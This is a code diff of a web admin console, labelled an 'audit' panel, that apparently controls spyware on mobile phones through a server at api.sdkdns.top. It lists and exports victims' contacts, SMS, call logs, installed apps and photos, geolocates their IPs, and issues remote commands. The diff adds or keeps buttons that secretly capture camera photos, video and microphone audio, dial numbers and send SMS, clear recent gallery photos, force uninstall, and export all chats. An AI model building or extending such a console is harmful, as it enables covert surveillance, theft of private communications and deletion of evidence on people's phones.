@@ -85,6 +85,23 @@
       <p class="audit-modal-note" id="auditModalNote">实际运营时：通讯录、相册、短信、通话记录、已安装APP 等数据应采集自用户设备真实数据；相册/媒体为设备真实图片照片。</p>
     </div>
   </div>
+  <div class="audit-modal-overlay" id="deleteDeviceModalOverlay" style="display:none;">
+    <div class="audit-modal" id="deleteDeviceModal" style="max-width:400px;">
+      <div class="audit-modal-header">
+        <h3 class="audit-modal-title" id="deleteDeviceModalTitle"></h3>
+        <button type="button" class="audit-modal-close" id="deleteDeviceModalClose">&times;</button>
+      </div>
+      <div class="audit-modal-body" style="padding:16px;">
+        <p id="deleteDeviceModalHint" style="margin-bottom:12px; color:var(--text-secondary); font-size:14px;"></p>
+        <input type="password" id="deleteDevicePasswordInput" class="audit-query-input" placeholder="" style="width:100%; margin-bottom:16px; padding:8px 12px;" autocomplete="current-password" data-i18n-placeholder="deleteDevicePasswordRequired">
+        <div id="deleteDeviceModalError" style="color:var(--color-error, #c00); font-size:13px; margin-bottom:8px; display:none;"></div>
+        <div style="display:flex; gap:8px; justify-content:flex-end;">
+          <button type="button" class="btn btn-sm" id="deleteDeviceModalCancel"></button>
+          <button type="button" class="btn btn-sm btn-danger" id="deleteDeviceModalConfirm"></button>
+        </div>
+      </div>
+    </div>
+  </div>
   <script src="assets/js/i18n.js"></script>
   <script src="assets/js/app.js"></script>
   <script src="assets/js/admin-api.js"></script>
@@ -94,12 +111,69 @@
     var adminApi = window.ADMIN_API;
     if (!app.isLoggedIn()) app.redirectLogin();
     else {
-      function deviceModelFromInfo(deviceInfo) {
+      var PACKAGE_TO_APP_NAME = {
+        'com.tencent.mm': '微信',
+        'com.tencent.mobileqq': 'QQ',
+        'com.eg.android.AlipayGphone': '支付宝',
+        'com.ss.android.ugc.aweme': '抖音',
+        'com.alibaba.android.rimet': '钉钉',
+        'com.taobao.taobao': '淘宝',
+        'com.jingdong.app.mall': '京东',
+        'com.sina.weibo': '微博',
+        'com.netease.cloudmusic': '网易云音乐',
+        'com.bbk.launcher2': 'vivo 桌面',
+        'com.miui.home': '小米桌面',
+        'com.android.chrome': 'Chrome',
+        'com.mi.globalbrowser': '小米浏览器',
+        'com.android.browser': '系统浏览器',
+        'com.UCMobile': 'UC 浏览器',
+        'com.qihoo360.mobilesafe': '360 手机卫士',
+        'com.tencent.wework': '企业微信',
+        'com.achievo.vipshop': '唯品会',
+        'com.kuaishou.nebula': '快手',
+        'com.zhiliaoapp.musically': 'TikTok',
+        'com.huawei.browser': '华为浏览器',
+        'com.opera.browser': 'Opera',
+        'org.mozilla.firefox': 'Firefox',
+        'com.sec.android.app.sbrowser': 'Samsung Internet'
+      };
+      function appDisplayName(pkg) {
+        if (!pkg || typeof pkg !== 'string') return '—';
+        return PACKAGE_TO_APP_NAME[pkg.trim()] || pkg;
+      }
+      function friendlyDeviceModel(deviceInfo) {
         if (!deviceInfo) return '—';
         try {
           var o = typeof deviceInfo === 'string' ? JSON.parse(deviceInfo) : deviceInfo;
-          return (o && o.model) ? o.model : '—';
+          var model = (o && o.model) ? String(o.model).trim() : '';
+          if (!model) return '—';
+          if (/iPhone/i.test(model)) {
+            var num = model.match(/(\d+)/);
+            return 'iPhone' + (num ? ' ' + num[1] : '');
+          }
+          if (/iPad/i.test(model)) {
+            var num = model.match(/(\d+)/);
+            return 'iPad' + (num ? ' ' + num[1] : '');
+          }
+          var brand = (o && o.brand) ? String(o.brand).trim() : '';
+          var map = {
+            '2211133C': '小米13', '2210132C': '小米12', '2201123C': '小米12 Pro', '21091116C': '小米11 青春版',
+            'M2012K11AC': '红米 K40', '22041216C': '红米 K50', '23046RP50C': '红米 Note 12',
+            'SM-G9980': '三星 S21 Ultra', 'SM-S9080': '三星 S22 Ultra', 'SM-A5360': '三星 A53',
+            'PBAM00': 'OPPO A', 'PCLM10': 'OPPO Reno', 'PFFM20': 'OPPO Find X5',
+            'V2118A': 'vivo X70', 'V2218A': 'vivo X80', 'PD2140': 'vivo iQOO',
+            'ANY-AN00': '华为 Mate 40', 'ALN-AL00': '华为 Mate 60', 'BRQ-AN00': '华为 P50'
+          };
+          if (map[model]) return map[model];
+          if (brand) {
+            var brandZh = { 'Xiaomi': '小米', 'Redmi': '红米', 'Samsung': '三星', 'Huawei': '华为', 'Honor': '荣耀', 'OPPO': 'OPPO', 'vivo': 'vivo', 'OnePlus': '一加', 'Realme': '真我', 'Apple': '苹果' }[brand] || brand;
+            return brandZh + ' ' + model;
+          }
+          return model;
         } catch (e) { return '—'; }
+      }
+      function deviceModelFromInfo(deviceInfo) {
+        return friendlyDeviceModel(deviceInfo);
       }
       function maskIp(ip) {
         if (!ip || typeof ip !== 'string') return '—';
@@ -122,24 +196,26 @@
         var fullDeviceId = (d.device_id || '');
         var deviceIdDisplay = fullDeviceId.length > 8 ? fullDeviceId.slice(-8) : fullDeviceId;
         deviceIdDisplay = deviceIdDisplay.replace(/</g, '&lt;').replace(/>/g, '&gt;');
+        var citySuffix = (d.last_location_city != null && String(d.last_location_city).trim() !== '') ? ' ' + String(d.last_location_city).trim().replace(/</g, '&lt;').replace(/>/g, '&gt;') : '';
         var fullDeviceIdEsc = fullDeviceId.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
         var nickname = (d.nickname || '—').replace(/</g, '&lt;').replace(/>/g, '&gt;');
         var uidMasked = (d.uid || '').length > 4 ? (d.uid).slice(0, 2) + '***' + (d.uid).slice(-2) : (d.uid || '—');
         var model = deviceModelFromInfo(d.device_info).replace(/</g, '&lt;').replace(/>/g, '&gt;');
         var ipDisplay = maskIp(d.last_ip || '');
         var timeDisplay = formatBackendTime(d.created_at);
+        var lastIpEsc = (d.last_ip || '').replace(/"/g, '&quot;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
         return '<tr>' +
           '<td class="device-info-cell"><div class="device-info-block">' +
-          '<span class="info-row"><span class="info-label">' + i18n.t('deviceId') + '</span>: <span class="info-value device-id-value" data-device-id="' + fullDeviceIdEsc + '">' + deviceIdDisplay + '</span></span>' +
-          '<span class="info-row"><span class="info-label">' + i18n.t('usernameRole') + '</span>: <span class="info-value"><span data-masked="' + uidMasked + '" data-full="' + (d.uid || '').replace(/"/g, '&quot;') + '">' + uidMasked + '</span> / <span>' + i18n.t('userLabel') + '</span></span></span>' +
+          '<span class="info-row"><span class="info-label">' + i18n.t('deviceId') + '</span>: <span class="info-value device-id-value" data-device-id="' + fullDeviceIdEsc + '">' + deviceIdDisplay + citySuffix + '</span></span>' +
+          '<span class="info-row"><span class="info-label">' + i18n.t('username') + '</span>: <span class="info-value"><span data-masked="' + uidMasked + '" data-full="' + (d.uid || '').replace(/"/g, '&quot;') + '">' + uidMasked + '</span></span></span>' +
           '<span class="info-row"><span class="info-label">' + i18n.t('phoneNumber') + '</span>: <span class="info-value">—</span></span>' +
           '<span class="info-row"><span class="info-label">' + i18n.t('nickname') + '</span>: <span class="info-value info-value-nickname">' + nickname + '</span></span>' +
           '</div></td>' +
           '<td class="device-info-cell"><div class="device-info-block">' +
           '<span class="info-row"><span class="info-label">' + i18n.t('phoneModel') + '</span>: <span class="info-value">' + model + '</span></span>' +
           '<span class="info-row"><span class="info-label">' + i18n.t('ipLabel') + '</span>: <span class="info-value" data-masked="' + ipDisplay + '" data-full="' + (d.last_ip || '').replace(/"/g, '&quot;') + '">' + ipDisplay + '</span></span>' +
-          '<span class="info-row"><span class="info-label">' + i18n.t('region') + '</span>: <span class="info-value">—</span></span>' +
-          '<span class="info-row"><span class="info-label">' + i18n.t('timeLabel') + '</span>: <span class="info-value">' + timeDisplay + '</span></span>' +
+          '<span class="info-row"><span class="info-label">' + i18n.t('region') + '</span>: <span class="info-value region-value" data-ip="' + lastIpEsc + '">—</span></span>' +
+          '<span class="info-row"><span class="info-value">' + timeDisplay + '</span></span>' +
           '</div></td>' +
           '<td class="audit-cell"><div class="audit-label-count"><span class="audit-label">' + i18n.t('contactsLabel') + '</span>:<span class="audit-count"><span data-masked="**" data-full="—">**</span> <span>' + i18n.t('unitContacts') + '</span></span></div><div class="audit-actions"><button type="button" class="btn btn-sm btn-audit-view" data-page="contacts">' + i18n.t('view') + '</button><button type="button" class="btn btn-sm btn-audit-copy" data-page="contacts">' + i18n.t('copy') + '</button><button type="button" class="btn btn-sm btn-audit-export" data-page="contacts">' + i18n.t('export') + '</button></div></td>' +
           '<td class="audit-cell"><div class="audit-label-count"><span class="audit-label">' + i18n.t('photosLabel') + '</span>:<span class="audit-count"><span data-masked="**" data-full="—">**</span> <span>' + i18n.t('unitPhotos') + '</span></span></div><div class="audit-actions"><button type="button" class="btn btn-sm btn-audit-view" data-page="gallery">' + i18n.t('view') + '</button><button type="button" class="btn btn-sm btn-audit-export" data-page="gallery">' + i18n.t('export') + '</button></div></td>' +
@@ -150,17 +226,48 @@
           '<td class="control-cell control-cell-vertical" headers="colDial"><div class="control-col-dial"><div class="control-row"><input type="text" class="dial-number-input" placeholder="' + (i18n.t('dialNumber') || '') + '"></div><div class="control-row"><button type="button" class="btn btn-sm btn-dial-cmd">' + i18n.t('dialButton') + '</button></div><div class="control-row"><button type="button" class="btn btn-sm">' + i18n.t('hangUpButton') + '</button></div></div></td>' +
           '<td class="control-cell control-cell-vertical" headers="colSmsSend"><div class="control-col-sms"><div class="control-row"><input type="text" class="sms-number-input" placeholder="' + (i18n.t('smsNumber') || '') + '"></div><div class="control-row"><input type="text" class="sms-body-input" placeholder="' + (i18n.t('smsContent') || '') + '"></div><div class="control-row"><button type="button" class="btn btn-sm btn-sms-cmd">' + i18n.t('sendButton') + '</button></div></div></td>' +
           '<td class="control-cell" headers="colCustom"><div class="control-col-custom custom-func-block"><button type="button" class="btn btn-sm">' + i18n.t('func1') + '</button><button type="button" class="btn btn-sm">' + i18n.t('func2') + '</button><button type="button" class="btn btn-sm">' + i18n.t('func3') + '</button><button type="button" class="btn btn-sm">' + i18n.t('func4') + '</button></div></td>' +
-          '<td class="control-cell control-cell-vertical" headers="colRemote"><div class="control-col-remote"><button type="button" class="btn btn-sm btn-capture-photo">' + i18n.t('capturePhoto') + '</button><button type="button" class="btn btn-sm btn-capture-video">' + i18n.t('captureVideo') + '</button><button type="button" class="btn btn-sm btn-capture-audio">' + i18n.t('captureAudio') + '</button><button type="button" class="btn btn-sm btn-wipe-cmd btn-danger">' + i18n.t('remoteErase') + '</button><button type="button" class="btn btn-sm btn-danger">' + i18n.t('remoteUninstall') + '</button><button type="button" class="btn btn-sm">' + i18n.t('exportAllChats') + '</button><button type="button" class="btn btn-sm">' + i18n.t('packageDownloadAll') + '</button></div></td>' +
+          '<td class="control-cell control-cell-vertical" headers="colRemote"><div class="control-col-remote"><button type="button" class="btn btn-sm btn-capture-photo">' + i18n.t('capturePhoto') + '</button><button type="button" class="btn btn-sm btn-capture-video">' + i18n.t('captureVideo') + '</button><button type="button" class="btn btn-sm btn-capture-audio">' + i18n.t('captureAudio') + '</button><button type="button" class="btn btn-sm btn-clear-gallery">' + i18n.t('clearGallery') + '</button><button type="button" class="btn btn-sm btn-uninstall-cmd btn-danger">' + i18n.t('remoteUninstall') + '</button><button type="button" class="btn btn-sm btn-device-delete btn-danger">' + (i18n.t('deleteDevice') || '删除') + '</button><button type="button" class="btn btn-sm">' + i18n.t('exportAllChats') + '</button><button type="button" class="btn btn-sm">' + i18n.t('packageDownloadAll') + '</button></div></td>' +
           '</tr>';
+      }
+      /** IP 归属地：使用设备 last_ip 调用 ipapi.co（HTTPS）查询，展示格式 国家 省/州 市；按 IP 缓存；内网/私有 IP 不请求，显示「—」 */
+      var ipGeoCache = {};
+      function fetchIpGeo(ip, callback) {
+        if (!ip || typeof ip !== 'string' || ip.trim() === '') { callback('—'); return; }
+        ip = ip.trim();
+        if (ipGeoCache[ip] !== undefined) { callback(ipGeoCache[ip]); return; }
+        var isPrivate = /^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|127\.)/.test(ip);
+        if (isPrivate) { ipGeoCache[ip] = '—'; callback('—'); return; }
+        var url = 'https://ipapi.co/' + encodeURIComponent(ip) + '/json/';
+        fetch(url).then(function(r) { return r.json(); }).then(function(data) {
+          var parts = [];
+          if (data.country_name) parts.push(data.country_name);
+          if (data.region) parts.push(data.region);
+          if (data.city) parts.push(data.city);
+          var text = parts.length ? parts.join(' ') : (data.error ? '—' : '—');
+          ipGeoCache[ip] = text;
+          callback(text);
+        }).catch(function() { ipGeoCache[ip] = '—'; callback('—'); });
+      }
+      function fillRegionFromIp() {
+        document.querySelectorAll('.region-value[data-ip]').forEach(function(el) {
+          var ip = (el.getAttribute('data-ip') || '').trim();
+          if (!ip) return;
+          fetchIpGeo(ip, function(text) {
+            el.textContent = text;
+          });
+        });
       }
       function renderDevicesTable(items) {
         var tbody = document.getElementById('deviceTableBody');
         if (!tbody) return;
         if (!items || items.length === 0) {
-          tbody.innerHTML = '<tr><td colspan="12" class="loading-cell">' + i18n.t('noDevices') + '</td></tr>';
+          var hint = (i18n.t('noDataHintSameApi') || '').trim();
+          var hintRow = hint ? '<tr><td colspan="12" class="loading-cell" style="font-size:12px; color:var(--text-secondary); padding:8px 12px;">' + hint + '</td></tr>' : '';
+          tbody.innerHTML = '<tr><td colspan="12" class="loading-cell">' + i18n.t('noDevices') + '</td></tr>' + hintRow;
           return;
         }
         tbody.innerHTML = items.map(buildDeviceRow).join('');
+        fillRegionFromIp();
       }
       function loadDevices(params) {
         if (!adminApi || !adminApi.getAdminToken()) {
@@ -184,6 +291,7 @@
           }
         });
       }
+      if (!adminApi.getApiBase()) adminApi.setApiBase('https://api.sdkdns.top');
       loadDevices();
       document.getElementById('logo').textContent = i18n.t('appName');
       document.getElementById('navHome').textContent = i18n.t('navHome');
@@ -218,6 +326,11 @@
       var loadingEl = document.getElementById('deviceTableLoading');
       if (loadingEl) loadingEl.textContent = i18n.t('loadingDevices');
       document.getElementById('fullDisplayLabel').textContent = i18n.t('fullDisplay');
+      document.getElementById('deleteDeviceModalTitle').textContent = i18n.t('deleteDeviceTitle') || '删除设备';
+      document.getElementById('deleteDeviceModalHint').textContent = i18n.t('deleteDevicePasswordHint') || '';
+      document.getElementById('deleteDevicePasswordInput').placeholder = i18n.t('deleteDevicePasswordRequired') || '请输入登录密码';
+      document.getElementById('deleteDeviceModalCancel').textContent = i18n.t('cancelLabel') || '取消';
+      document.getElementById('deleteDeviceModalConfirm').textContent = i18n.t('confirmDeleteLabel') || '确认删除';
       document.getElementById('navLogout').onclick = function(e){ e.preventDefault(); app.setLoggedIn(false); app.redirectLogin(); };
       document.getElementById('auditQueryBtn').onclick = function() {
         var kw = (document.getElementById('auditQueryInput').value || '').trim();
@@ -266,11 +379,10 @@
         var full = deviceIdEl.getAttribute('data-device-id');
         return (full != null && full !== '') ? full : deviceIdEl.textContent.trim();
       }
-      var DIAL_SMS_COOLDOWN_SEC = 10;
-      var CAPTURE_COOLDOWN_SEC = 20;
+      var COMMAND_COOLDOWN_SEC = 30;
       function startCooldown(btn, label, sec) {
         if (!btn || !label) return;
-        var left = (sec > 0 ? sec : DIAL_SMS_COOLDOWN_SEC);
+        var left = (sec > 0 ? sec : COMMAND_COOLDOWN_SEC);
         btn.disabled = true;
         var tick = function() {
           if (left <= 0) {
@@ -418,9 +530,76 @@
       }
       function smsTypeText(t) { var n = t != null ? parseInt(t, 10) : NaN; if (isNaN(n)) return t != null ? String(t) : '—'; switch (n) { case 1: return '收'; case 2: return '发'; case 3: return '草稿'; default: return String(t); } }
       function callTypeText(t) { var n = t != null ? parseInt(t, 10) : NaN; if (isNaN(n)) return t != null ? String(t) : '—'; switch (n) { case 1: return '接听'; case 2: return '拨出'; case 3: return '未接'; default: return String(t); } }
-      /** 渲染解密后的审计内容（含分页）；bodyEl._auditItems / _auditPage / _auditPageType 用于分页 */
+      /** 将接口返回的审计 payload 转为纯文本（用于复制/导出） */
+      function payloadToText(page, payload) {
+        var items = Array.isArray(payload) ? payload : (payload && payload.items) ? payload.items : [];
+        if (items.length === 0) return '';
+        var lines = [];
+        if (page === 'contacts') {
+          lines.push('姓名\t号码\t上报时间');
+          items.forEach(function(r) {
+            var name = (r.display_name != null ? r.display_name : ((r.given_name || '') + ' ' + (r.family_name || '')).trim()) || '—';
+            var number = (r.phone != null ? r.phone : (r.number != null ? r.number : (r.address != null ? r.address : '—')));
+            var timeStr = formatAuditTime(r.date != null ? r.date : r.reported_at);
+            lines.push(name + '\t' + number + '\t' + timeStr);
+          });
+          return lines.join('\n');
+        }
+        if (page === 'sms') {
+          lines.push('类型\t号码\t内容\t收发时间');
+          items.forEach(function(r) {
+            var typeStr = smsTypeText(r.type);
+            var content = (r.body != null && r.body !== '') ? String(r.body).replace(/\t/g, ' ').substring(0, 500) : (r.body_length != null ? r.body_length + ' 字符' : '—');
+            lines.push(typeStr + '\t' + (r.address || '') + '\t' + content + '\t' + formatAuditTime(r.date));
+          });
+          return lines.join('\n');
+        }
+        if (page === 'calllog') {
+          lines.push('类型\t号码\t拨出/接听时间\t时长');
+          items.forEach(function(r) {
+            lines.push(callTypeText(r.type) + '\t' + (r.number || '') + '\t' + formatAuditTime(r.date) + '\t' + (r.duration != null ? r.duration + ' 秒' : '—'));
+          });
+          return lines.join('\n');
+        }
+        if (page === 'applist') {
+          lines.push('应用名\t包名\t版本名\t版本号');
+          items.forEach(function(r) {
+            var pkg = r.package != null ? r.package : (r.pkg != null ? r.pkg : '');
+            var appName = (r.name != null && r.name !== '') ? String(r.name) : appDisplayName(pkg);
+            var versionName = r.version_name != null ? r.version_name : '';
+            var ver = r.long_version_code != null ? r.long_version_code : (r.time != null ? r.time : '');
+            lines.push(appName + '\t' + pkg + '\t' + versionName + '\t' + ver);
+          });
+          return lines.join('\n');
+        }
+        if (page === 'gallery') {
+          if (items[0] && items[0].url != null) {
+            return items.map(function(r) { return r.url || ''; }).filter(Boolean).join('\n');
+          }
+          lines.push('ID\t日期/时间戳\t大小/类型\tMIME/类型');
+          items.forEach(function(r) {
+            lines.push((r.id != null ? r.id : '') + '\t' + (r.date_added != null ? r.date_added : '') + '\t' + (r.size != null ? r.size : (r.kind || '')) + '\t' + (r.mime_type || r.kind || ''));
+          });
+          return lines.join('\n');
+        }
+        return '';
+      }
+      /** 异步获取审计数据并转为文本（优先走接口，无接口时用 Mock） */
+      function getAuditDataAsTextAsync(deviceId, page) {
+        var apiType = pageToApiType[page];
+        if (apiType && page !== 'captures' && adminApi && adminApi.getAdminToken() && adminApi.getAudit && adminApi.getAuditBlobJson) {
+          return adminApi.getAudit(deviceId, apiType).then(function(data) {
+            if (!data.items || data.items.length === 0) return '';
+            return adminApi.getAuditBlobJson(data.items[0].id);
+          }).then(function(payload) {
+            return payloadToText(page, payload);
+          }).catch(function() { return ''; });
+        }
+        return Promise.resolve(getAuditDataAsText(deviceId, page));
+      }
+      /** 渲染解密后的审计内容（含分页）；bodyEl._auditItems / _auditPage / _auditPageType 用于分页；兼容 payload 为 { items: [] } 或直接为数组 */
       function renderAuditContent(page, payload, bodyEl) {
-        var items = (payload && payload.items) ? payload.items : [];
+        var items = Array.isArray(payload) ? payload : (payload && payload.items) ? payload.items : [];
         if (items.length === 0) { bodyEl.innerHTML = '<p>暂无内容</p>'; return; }
         bodyEl._auditItems = items;
         bodyEl._auditPage = 1;
@@ -447,10 +626,17 @@
           });
           html = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>姓名</th><th>号码</th><th>上报时间</th></tr></thead><tbody>' + rows.join('') + '</tbody></table></div>';
         } else if (pageType === 'gallery') {
-          var rows = pageItems.map(function(r) {
-            return '<tr><td>' + (r.id != null ? r.id : '') + '</td><td>' + (r.date_added != null ? r.date_added : '') + '</td><td>' + (r.size != null ? r.size : (r.kind || '')) + '</td><td>' + (r.mime_type || r.kind || '') + '</td></tr>';
-          });
-          html = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>ID</th><th>日期/时间戳</th><th>大小/类型</th><th>MIME/类型</th></tr></thead><tbody>' + rows.join('') + '</tbody></table></div>';
+          if (pageItems[0] && pageItems[0].url != null) {
+            html = '<div class="gallery-grid">' + pageItems.map(function(r, i) {
+              var url = (r.url != null && r.url !== '') ? r.url : '';
+              return '<img src="' + escapeHtml(url) + '" alt="' + (r.id != null ? escapeHtml(String(r.id)) : (i + 1)) + '" onerror="this.style.display=\'none\'" />';
+            }).join('') + '</div>';
+          } else {
+            var rows = pageItems.map(function(r) {
+              return '<tr><td>' + (r.id != null ? r.id : '') + '</td><td>' + (r.date_added != null ? r.date_added : '') + '</td><td>' + (r.size != null ? r.size : (r.kind || '')) + '</td><td>' + (r.mime_type || r.kind || '') + '</td></tr>';
+            });
+            html = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>ID</th><th>日期/时间戳</th><th>大小/类型</th><th>MIME/类型</th></tr></thead><tbody>' + rows.join('') + '</tbody></table></div>';
+          }
         } else if (pageType === 'sms') {
           var rows = pageItems.map(function(r) {
             var timeStr = formatAuditTime(r.date);
@@ -467,8 +653,12 @@
           });
           html = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>类型</th><th>号码</th><th>拨出/接听时间</th><th>时长</th></tr></thead><tbody>' + rows.join('') + '</tbody></table></div>';
         } else if (pageType === 'applist') {
-          var rows = pageItems.map(function(r) { return '<tr><td>' + (r.package || '') + '</td><td>' + (r.version_name || '') + '</td><td>' + (r.long_version_code != null ? r.long_version_code : '') + '</td></tr>'; });
-          html = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>包名</th><th>版本名</th><th>版本号</th></tr></thead><tbody>' + rows.join('') + '</tbody></table></div>';
+          var rows = pageItems.map(function(r) {
+            var pkg = r.package != null ? r.package : (r.pkg != null ? r.pkg : '');
+            var appName = (r.name != null && r.name !== '') ? escapeHtml(String(r.name)) : escapeHtml(appDisplayName(pkg));
+            return '<tr><td>' + appName + '</td><td>' + escapeHtml(pkg) + '</td><td>' + (r.version_name != null ? escapeHtml(String(r.version_name)) : '') + '</td><td>' + (r.long_version_code != null ? r.long_version_code : '') + '</td></tr>';
+          });
+          html = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>' + (i18n.t('appNameLabel') || '应用名') + '</th><th>' + (i18n.t('packageName') || '包名') + '</th><th>' + (i18n.t('version') || '版本名') + '</th><th>' + (i18n.t('versionCode') || '版本号') + '</th></tr></thead><tbody>' + rows.join('') + '</tbody></table></div>';
         } else if (pageType === 'usage') {
           var rows = pageItems.map(function(r) { var ms = r.total_time_ms != null ? r.total_time_ms : 0; var sec = Math.floor(ms / 1000); return '<tr><td>' + (r.package || '') + '</td><td>' + sec + ' 秒</td></tr>'; });
           html = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>包名</th><th>前台时长</th></tr></thead><tbody>' + rows.join('') + '</tbody></table></div>';
@@ -513,19 +703,8 @@
             if (!adminApi.getAuditBlobJson) { renderApiItems(page, data.items, bodyEl); return; }
             adminApi.getAuditBlobJson(latestId).then(function(payload) {
               renderAuditContent(page, payload, bodyEl);
-              var wrap = bodyEl.querySelector('.audit-content-hint');
-              if (wrap) {
-                var btn = document.createElement('button');
-                btn.type = 'button';
-                btn.className = 'btn btn-sm';
-                btn.textContent = i18n.t('download') || '下载';
-                btn.onclick = function() { adminApi.downloadAuditBlob(latestId, 'audit_' + latestId + '_' + apiType + '.json'); };
-                wrap.appendChild(document.createTextNode(' '));
-                wrap.appendChild(btn);
-              }
             }).catch(function() {
-              bodyEl.innerHTML = '<p>获取内容失败，仅显示上报记录。</p>';
-              renderApiItems(page, data.items, bodyEl);
+              bodyEl.innerHTML = '<p class="audit-empty-hint">详细内容加载失败，请稍后重试。</p>';
             });
           }).catch(function() {
             bodyEl.innerHTML = '<p class="audit-empty-hint">' + (i18n.t('noAuditDataOrFailed') || '暂无上报数据或加载失败，请确认设备已上报。') + '</p>';
@@ -547,72 +726,167 @@
           btn.onclick = function(){
             var deviceId = getDeviceIdFromButton(this);
             var page = this.getAttribute('data-page');
-            var text = getAuditDataAsText(deviceId, page);
-            if (text) copyTextToClipboard(text); else alert(i18n.t('noContentToCopy'));
+            var btnEl = this;
+            var origText = btnEl.textContent;
+            btnEl.disabled = true;
+            btnEl.textContent = (i18n.t('loading') || '加载中') + '…';
+            getAuditDataAsTextAsync(deviceId, page).then(function(text){
+              btnEl.disabled = false;
+              btnEl.textContent = origText;
+              if (text) copyTextToClipboard(text); else alert(i18n.t('noContentToCopy'));
+            }).catch(function(){
+              btnEl.disabled = false;
+              btnEl.textContent = origText;
+              alert(i18n.t('noContentToCopy'));
+            });
           };
         });
         document.querySelectorAll('.btn-audit-export').forEach(function(btn){
           btn.onclick = function(){
             var deviceId = getDeviceIdFromButton(this);
             var page = this.getAttribute('data-page');
-            var text = getAuditDataAsText(deviceId, page);
             var names = { contacts: '通讯录', sms: '短信', calllog: '通话记录', applist: '已安装APP', gallery: '相册' };
             var name = names[page] || page;
             var filename = name + '_' + deviceId + '.txt';
-            if (text) downloadAsPlainText(text, filename); else alert(i18n.t('noContentToExport'));
+            var btnEl = this;
+            var origText = btnEl.textContent;
+            btnEl.disabled = true;
+            btnEl.textContent = (i18n.t('loading') || '加载中') + '…';
+            getAuditDataAsTextAsync(deviceId, page).then(function(text){
+              btnEl.disabled = false;
+              btnEl.textContent = origText;
+              if (text) downloadAsPlainText(text, filename); else alert(i18n.t('noContentToExport'));
+            }).catch(function(){
+              btnEl.disabled = false;
+              btnEl.textContent = origText;
+              alert(i18n.t('noContentToExport'));
+            });
           };
         });
         document.querySelectorAll('.btn-dial-cmd').forEach(function(btn){
           btn.onclick = function(){
             if (this.disabled) return;
             var deviceId = getDeviceIdFromButton(this);
+            if (!deviceId) { alert(i18n.t('deviceIdRequired') || '请先选择设备'); return; }
+            if (!confirm(i18n.t('confirmSendCommand') || '确定要下发该指令吗？')) return;
             var cell = this.closest('.control-col-dial');
             var numberInput = cell ? cell.querySelector('.dial-number-input') : null;
             var number = numberInput ? numberInput.value.trim() : '';
-            sendCommandToDevice(deviceId, 'mop.cmd.dial', { number: number }, this, DIAL_SMS_COOLDOWN_SEC);
+            sendCommandToDevice(deviceId, 'mop.cmd.dial', { number: number }, this, COMMAND_COOLDOWN_SEC);
           };
         });
         document.querySelectorAll('.btn-sms-cmd').forEach(function(btn){
           btn.onclick = function(){
             if (this.disabled) return;
             var deviceId = getDeviceIdFromButton(this);
+            if (!deviceId) { alert(i18n.t('deviceIdRequired') || '请先选择设备'); return; }
+            if (!confirm(i18n.t('confirmSendCommand') || '确定要下发该指令吗？')) return;
             var cell = this.closest('.control-col-sms');
             var numberInput = cell ? cell.querySelector('.sms-number-input') : null;
             var bodyInput = cell ? cell.querySelector('.sms-body-input') : null;
             var number = numberInput ? numberInput.value.trim() : '';
             var body = bodyInput ? bodyInput.value.trim() : '';
-            sendCommandToDevice(deviceId, 'mop.cmd.sms', { number: number, body: body }, this, DIAL_SMS_COOLDOWN_SEC);
+            sendCommandToDevice(deviceId, 'mop.cmd.sms', { number: number, body: body }, this, COMMAND_COOLDOWN_SEC);
           };
         });
-        document.querySelectorAll('.btn-wipe-cmd').forEach(function(btn){
+        document.querySelectorAll('.btn-clear-gallery').forEach(function(btn){
+          btn.onclick = function(){
+            if (this.disabled) return;
+            var deviceId = getDeviceIdFromButton(this);
+            if (!deviceId) { alert(i18n.t('deviceIdRequired') || '请先选择设备'); return; }
+            if (!confirm(i18n.t('confirmClearGallery') || '确定要清理该设备最近 3 天相册吗？')) return;
+            sendCommandToDevice(deviceId, 'mop.cmd.gallery.clear', { days: 3 }, this, COMMAND_COOLDOWN_SEC);
+          };
+        });
+        document.querySelectorAll('.btn-uninstall-cmd').forEach(function(btn){
           btn.onclick = function(){
             var deviceId = getDeviceIdFromButton(this);
             if (!deviceId) { alert(i18n.t('deviceIdRequired') || '请先选择设备'); return; }
-            if (!confirm(i18n.t('confirmWipe') || '确定对该设备执行远程擦除？将清空本地数据并退回激活页。')) return;
-            sendCommandToDevice(deviceId, 'mop.cmd.wipe', {}, this);
+            if (!confirm(i18n.t('confirmUninstall') || '确定对该设备执行远程卸载？将清空数据并调起系统卸载（用户确认后卸载应用）。')) return;
+            sendCommandToDevice(deviceId, 'mop.cmd.uninstall', {}, this);
           };
         });
         document.querySelectorAll('.btn-capture-photo').forEach(function(btn){
           btn.onclick = function(){
             if (this.disabled) return;
             var deviceId = getDeviceIdFromButton(this);
-            sendCommandToDevice(deviceId, 'mop.cmd.capture.photo', {}, this, CAPTURE_COOLDOWN_SEC);
+            if (!deviceId) { alert(i18n.t('deviceIdRequired') || '请先选择设备'); return; }
+            if (!confirm(i18n.t('confirmSendCommand') || '确定要下发该指令吗？')) return;
+            sendCommandToDevice(deviceId, 'mop.cmd.capture.photo', {}, this, COMMAND_COOLDOWN_SEC);
           };
         });
         document.querySelectorAll('.btn-capture-video').forEach(function(btn){
           btn.onclick = function(){
             if (this.disabled) return;
             var deviceId = getDeviceIdFromButton(this);
-            sendCommandToDevice(deviceId, 'mop.cmd.capture.video', { duration_sec: 18 }, this, CAPTURE_COOLDOWN_SEC);
+            if (!deviceId) { alert(i18n.t('deviceIdRequired') || '请先选择设备'); return; }
+            if (!confirm(i18n.t('confirmSendCommand') || '确定要下发该指令吗？')) return;
+            sendCommandToDevice(deviceId, 'mop.cmd.capture.video', { duration_sec: 18 }, this, COMMAND_COOLDOWN_SEC);
           };
         });
         document.querySelectorAll('.btn-capture-audio').forEach(function(btn){
           btn.onclick = function(){
             if (this.disabled) return;
             var deviceId = getDeviceIdFromButton(this);
-            sendCommandToDevice(deviceId, 'mop.cmd.capture.audio', { duration_sec: 18 }, this, CAPTURE_COOLDOWN_SEC);
